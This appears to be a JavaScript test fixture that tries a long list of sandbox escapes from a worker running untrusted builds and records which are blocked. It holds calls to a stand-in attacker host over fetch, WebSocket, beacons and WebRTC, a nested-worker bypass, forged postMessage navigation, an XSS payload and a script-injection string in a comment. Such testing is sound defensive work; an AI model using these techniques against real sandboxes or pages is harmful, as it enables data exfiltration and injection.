// Every escape a malicious build might try from inside the worker it runs in.
// Each entry records whether the attempt was stopped ("blocked") or went
// through ("ALLOWED"). The test also watches a stand-in attacker server.
const CANARY = "__CANARY__";
const PROBE = "__PROBE__";
const results = {};
self.__results = results;
const settle = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
const attempt = async (name, fn) => {
  try {
    const outcome = await fn();
    results[name] = outcome === false ? "blocked" : "ALLOWED";
  } catch {
    results[name] = "blocked";
  }
};

(async () => {
  await attempt("fetch", () => fetch(CANARY + "/hit/fetch", { mode: "no-cors" }));
  await attempt("xhr", () => new Promise((resolve, reject) => {
    const xhr = new XMLHttpRequest();
    xhr.open("GET", CANARY + "/hit/xhr");
    xhr.onload = () => resolve(true);
    xhr.onerror = () => reject(new Error("blocked"));
    xhr.send();
  }));
  await attempt("websocket", () => new Promise((resolve, reject) => {
    const ws = new WebSocket(CANARY.replace("http", "ws") + "/hit/ws");
    ws.onopen = () => resolve(true);
    ws.onerror = () => reject(new Error("blocked"));
  }));
  await attempt("eventsource", () => new Promise((resolve, reject) => {
    const es = new EventSource(CANARY + "/hit/sse");
    es.onopen = () => resolve(true);
    es.onerror = () => reject(new Error("blocked"));
  }));
  await attempt("webtransport", () => new WebTransport(CANARY.replace("http", "https") + "/hit/wt").ready.then(() => true));
  await attempt("load outside script", () => { importScripts(CANARY + "/hit/import.js"); return true; });
  await attempt("load outside font", () => new FontFace("x", `url(${CANARY}/hit/font.woff2)`).load().then(() => true));
  await attempt("load outside image", () => fetch(CANARY + "/hit/image.png").then((r) => r.blob()).then(createImageBitmap).then(() => true));
  await attempt("send beacon", () => navigator.sendBeacon(CANARY + "/hit/beacon", "x"));
  await attempt("webrtc", async () => {
    const pc = new RTCPeerConnection({ iceServers: [{ urls: [`stun:${PROBE}`, `turn:${PROBE}?transport=tcp`], username: "stolen", credential: "x" }] });
    pc.createDataChannel("x");
    await pc.setLocalDescription(await pc.createOffer());
    return true;
  });
  await attempt("call the gallery api", () => fetch("__GALLERY__/api/v1/status").then(() => true));
  await attempt("network from a nested worker", () => new Promise((resolve, reject) => {
    const source = `fetch("${CANARY}/hit/nested").then(() => postMessage("out"), () => postMessage("stuck"))`;
    const nested = new Worker(URL.createObjectURL(new Blob([source])));
    nested.onmessage = (event) => (event.data === "out" ? resolve(true) : reject(new Error("blocked")));
    nested.onerror = () => reject(new Error("blocked"));
    setTimeout(() => reject(new Error("blocked")), 1500);
  }));
  await attempt("eval", () => eval("1 + 1") === 2);
  await attempt("new Function", () => new Function("return 1")() === 1);
  await attempt("webassembly", () => WebAssembly.instantiate(new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0])));
  await attempt("indexedDB", () => new Promise((resolve, reject) => {
    const request = indexedDB.open("x");
    request.onsuccess = () => resolve(true);
    request.onerror = () => reject(new Error("blocked"));
  }));
  await attempt("cache storage", () => caches.open("x").then(() => true));
  await attempt("service worker", () => navigator.serviceWorker.register("/sw.js").then(() => true));
  await attempt("reach the page", () => typeof document !== "undefined" || typeof window !== "undefined" || typeof parent !== "undefined");
  await attempt("open a window", () => { open(CANARY + "/hit/popup"); return true; });
  await attempt("show a dialog", () => { alert("fake warning"); return true; });
  await attempt("navigate away", async () => {
    const before = self.location.href;
    try { self.location = CANARY + "/hit/navigate"; } catch { /* read-only */ }
    await settle(300);
    return self.location.href !== before;
  });
  await attempt("clipboard", () => navigator.clipboard.writeText("x").then(() => true));
  await attempt("geolocation", () => new Promise((resolve, reject) => {
    navigator.geolocation.getCurrentPosition(() => resolve(true), () => reject(new Error("blocked")));
  }));
  await settle(500);
  results.__done = "blocked";
})();

// Forged messages to the page that hosts the build must do nothing.
postMessage({ type: "navigate", url: CANARY + "/hit/forged" });
postMessage("<img src=x onerror=alert(1)>");

// A build still has to be able to do its real job.
const ctx = canvas.getContext("2d");
on("frame", () => {
  ctx.fillStyle = "#c0392b";
  ctx.fillRect(0, 0, canvas.width, canvas.height);
  self.__drew = true;
});
// Markup hidden in the code must not become part of the page: </script><script src="__CANARY__/hit/injected.js"></script><img src="__CANARY__/hit/injected.png">
